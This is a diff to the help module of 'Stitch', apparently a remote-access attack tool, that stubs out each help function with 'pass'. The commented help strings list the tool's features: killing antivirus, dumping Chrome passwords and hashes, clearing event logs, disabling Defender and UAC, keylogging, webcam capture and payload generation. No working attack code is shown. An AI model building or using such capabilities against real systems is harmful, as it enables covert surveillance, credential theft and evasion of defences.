@@ -148,278 +148,347 @@ from .stitch_utils import st_print
 ################################################################################
 
 def st_help_addkey():
-    # st_print("[*] Adds an AES key to the library; allowing communication with "\
-             "Stitch payloads which use that encryption key.")
-    usage_addkey()
+    pass
+    # st_print("[*] Adds an AES key to the library; allowing communication with "
+    #          "Stitch payloads which use that encryption key.")
+    # usage_addkey()
 
 def st_help_askpassword():
+    pass
     # st_print("[*] Displays security password prompt and returns user's input.")
-    usage_askpassword()
+    # usage_askpassword()
 
 def st_help_avscan():
+    pass
     # st_print('[*] Scans and lists possible Antiviruses installed.')
-    usage_avscan()
+    # usage_avscan()
 
 def st_help_avkill():
+    pass
     # st_print('[*] Attempts to terminate detected Antiviruses running.')
-    usage_avkill()
+    # usage_avkill()
 
 def st_help_cat():
+    pass
     # st_print('[*] Displays content of the file.')
-    usage_cat()
+    # usage_cat()
 
 def st_help_cd():
+    pass
     # st_print('[*] Displays the name of or changes the current directory.')
-    usage_cd()
+    # usage_cd()
 
 def st_help_chromedump():
+    pass
     # st_print('[*] Retrieves all passwords stored by Chrome.')
-    usage_chromedump()
+    # usage_chromedump()
 
 def st_help_cls():
+    pass
     # st_print('[*] Clears the screen.')
-    usage_cls()
+    # usage_cls()
 
 def st_help_clear():
+    pass
     # st_print('[*] Clears the screen.')
-    usage_clear()
+    # usage_clear()
 
 def st_help_clearev():
+    pass
     # st_print('[*] Clears System, Security, and Application event logs on a Windows machine.')
-    usage_clearev()
+    # usage_clearev()
 
 def st_help_connect():
+    pass
     # st_print('[*] Attempts to connect to a server running a stitch payload.')
-    usage_connect()
+    # usage_connect()
 
 def st_help_crackpassword():
+    pass
     # st_print('[*] Attempts to crack the sudo password by using a dictionary attack.')
-    usage_crackpassword()
+    # usage_crackpassword()
 
 def st_help_dir():
+    pass
     # st_print('[*] Displays a list of files and subdirectories in a directory.')
-    usage_dir()
+    # usage_dir()
 
 def st_help_disableRDP():
+    pass
     # st_print('[*] Disables Remote Desktop Protocol feature.')
-    usage_disableRDP()
+    # usage_disableRDP()
 
 def st_help_disableUAC():
+    pass
     # st_print('[*] Disables the User Account Control feature.')
-    usage_disableUAC()
+    # usage_disableUAC()
 
 def st_help_disableWindef():
+    pass
     # st_print('[*] Disables Windows Defender.')
-    usage_disableWindef()
+    # usage_disableWindef()
 
 def st_help_displayoff():
+    pass
     # st_print("[*] Turns off the display monitors.")
-    usage_displayoff()
+    # usage_displayoff()
 
 def st_help_displayon():
+    pass
     # st_print("[*] Turns on the display monitors.")
-    usage_displayon()
+    # usage_displayon()
 
 def st_help_download():
+    pass
     # st_print('[*] Downloads the specified file/dir to the Stitch Downloads folder.')
-    usage_download()
+    # usage_download()
 
 def st_help_drives():
+    pass
     # st_print('[*] Displays info of all drives on the system.')
-    usage_drives()
+    # usage_drives()
 
 def st_help_editaccessed():
+    pass
     # st_print('[*] Edits the "Accessed" date of a file.')
-    usage_editaccessed()
+    # usage_editaccessed()
 
 def st_help_editcreated():
+    pass
     # st_print('[*] Edits the "Created" date of a file')
-    usage_editcreated()
+    # usage_editcreated()
 
 def st_help_editmodified():
+    pass
     # st_print('[*] Edits the "Modified" date of a file.')
-    usage_editmodified()
+    # usage_editmodified()
 
 def st_help_enableRDP():
+    pass
     # st_print('[*] Enables Remote Desktop Protocol feature.')
-    usage_enableRDP()
+    # usage_enableRDP()
 
 def st_help_enableUAC():
+    pass
     # st_print('[*] Enables the User Account Control feature.')
-    usage_enableUAC()
+    # usage_enableUAC()
 
 def st_help_enableWindef():
+    pass
     # st_print('[*] Enables Windows Defender.')
-    usage_enableWindef()
+    # usage_enableWindef()
 
 def st_help_environment():
+    pass
     # st_print("[*] Displays the system's environment variables.")
-    usage_environment()
+    # usage_environment()
 
 def st_help_fileinfo():
+    pass
     # st_print('[*] Disaplys file information.')
-    usage_fileinfo()
+    # usage_fileinfo()
 
 def st_help_firewall():
+    pass
     # st_print('[*] Displays firewall status, open/close ports, or allow a program.')
-    usage_firewall()
+    # usage_firewall()
 
 def st_help_freeze():
+    pass
     # st_print("[*] Freezes the mouse and keyboard of the system. Allowing you to start/stop and view the status.")
-    usage_freeze()
+    # usage_freeze()
 
 def st_help_hashdump():
+    pass
     # st_print('[*] Grabs the password hashes stored on the system.')
-    usage_hashdump()
+    # usage_hashdump()
 
 def st_help_hide():
+    pass
     # st_print('[*] Hides the specified file/dir from the user.')
-    usage_hide()
+    # usage_hide()
 
 def st_help_history():
+    pass
     # st_print('[*] Displays information of past shell connections.')
-    usage_history()
+    # usage_history()
 
 def st_help_history_remove():
+    pass
     # st_print('[*] Removes the system from your history.')
-    usage_history_remove()
+    # usage_history_remove()
 
 def st_help_home():
+    pass
     # st_print('[*] Clears the screen and displays the Stitch banner.')
-    usage_home()
+    # usage_home()
 
 def st_help_hostsfile():
+    pass
     # st_print("[*] Updates, removes, or shows desired hostname and IP address from the system's hosts file.")
-    usage_hostsfile()
+    # usage_hostsfile()
 
 def st_help_ifconfig():
+    pass
     # st_print("[*] Displays the system's IP configuration.")
-    usage_ifconfig()
+    # usage_ifconfig()
 
 def st_help_ipconfig():
+    pass
     # st_print("[*] Displays the system's IP configuration.")
-    usage_ipconfig()
+    # usage_ipconfig()
 
 def st_help_keylogger():
+    pass
     # st_print("[*] Records keystrokes of the user. Allowing you to view the status, start, stop, and dump the keystokes to screen.")
-    usage_keylogger()
+    # usage_keylogger()
 
 def st_help_location():
+    pass
     # st_print("[*] Gives public IP and estimate geo location of the system.")
-    usage_location()
+    # usage_location()
 
 def st_help_lockscreen():
+    pass
     # st_print("[*] Enters the system's lock screen.")
-    usage_lockscreen()
+    # usage_lockscreen()
 
 def st_help_logintext():
+    pass
     # st_print("[*] Sets the text of the system's login screen.")
-    usage_logintext()
+    # usage_logintext()
 
 def st_help_ls():
+    pass
     # st_print('[*] Displays a list of files and subdirectories in a directory.')
-    usage_ls()
+    # usage_ls()
 
 def st_help_lsmod():
+    pass
     # st_print('[*] Displays list of all installed drivers.')
-    usage_lsmod()
+    # usage_lsmod()
 
 def st_help_listen():
+    pass
     # st_print('[*] Server binds to given port to listen for connections.')
-    usage_listen()
+    # usage_listen()
 
 def st_help_more():
+    pass
     # st_print('[*] Displays ouput of file path.')
-    usage_more()
+    # usage_more()
 
 def st_help_popup():
+    pass
     # st_print("[*] Displays popup box with custom message.")
-    usage_popup()
+    # usage_popup()
 
 def st_help_pwd():
+    pass
     # st_print('[*] Displays the name of the current directory.')
-    usage_pwd()
+    # usage_pwd()
 
 def st_help_pyexec():
+    pass
     # st_print('[*] Runs python script on the system.')
-    usage_pyexec()
+    # usage_pyexec()
 
 def st_help_ps():
+    pass
     # st_print('[*] Displays list of all running processes.')
-    usage_ps()
+    # usage_ps()
 
 def st_help_scanreg():
+    pass
     # st_print('[*] Display information on Windows Registry.')
-    usage_scanreg()
+    # usage_scanreg()
 
 def st_help_screenshot():
+    pass
     # st_print('[*] Takes a screenshot of the screen.')
-    usage_screenshot()
+    # usage_screenshot()
 
 def st_help_sessions():
+    pass
     # st_print('[*] Displays machines available for exploitation.')
-    usage_sessions()
+    # usage_sessions()
 
 def st_help_shell():
+    pass
     # st_print('[*] Opens a shell prompt of the requested session.')
-    usage_shell()
+    # usage_shell()
 
 def st_help_showkey():
+    pass
     # st_print('[*] Displays the active encrypted AES key used for payload creation.')
-    usage_showkey()
+    # usage_showkey()
 
 def st_help_ssh():
+    pass
     # st_print('[*] Attempts to open a ssh connection to the requested host.')
-    usage_ssh()
+    # usage_ssh()
 
 def st_help_start():
+    pass
     # st_print('[*] Starts the desired file.')
-    usage_start()
+    # usage_start()
 
 def st_help_stitchgen():
+    pass
     # st_print('[*] Generates stitch payloads based on running OS.')
-    usage_stitchgen()
+    # usage_stitchgen()
 
 def st_help_sudo():
+    pass
     # st_print("[*] Runs the preceding command with admin priveleges.")
-    usage_sudo()
+    # usage_sudo()
 
 def st_help_sysinfo():
+    pass
     # st_print('[*] Displays system information.')
-    usage_sysinfo()
+    # usage_sysinfo()
 
 def st_help_touch():
+    pass
     # st_print('[*] Creates a file with no contents.')
-    usage_touch()
+    # usage_touch()
 
 def st_help_unhide():
+    pass
     # st_print('[*] Unhides the specified file/dir from the user.')
-    usage_unhide()
+    # usage_unhide()
 
 def st_help_upload():
+    pass
     # st_print('[*] Uploads a file/dir to the system.')
-    usage_upload()
+    # usage_upload()
 
 def st_help_vmscan():
+    pass
     # st_print('[*] Detects if the system is a virtual machine.')
-    usage_vmscan()
+    # usage_vmscan()
 
 def st_help_webcamsnap():
+    pass
     # st_print('[*] Takes and downloads a picture using a connected webcamera.')
-    usage_webcamsnap()
+    # usage_webcamsnap()
 
 def st_help_webcamlist():
+    pass
     # st_print('[*] Displays list of connected webcameras.')
-    usage_webcamlist()
+    # usage_webcamlist()
 
 def st_help_wifikeys():
+    pass
     # st_print('[*] Displays all saved wifi passwords on the system.')
-    usage_wifikeys()
+    # usage_wifikeys()
 
 def st_help_exit():
+    pass
     # st_print('[*] Exits Stitch.')
-    usage_exit()
+    # usage_exit()
 
 def st_help_EOF():
+    pass
     # st_print('[*] Exits Stitch.')
-    usage_exit()
+    # usage_exit()
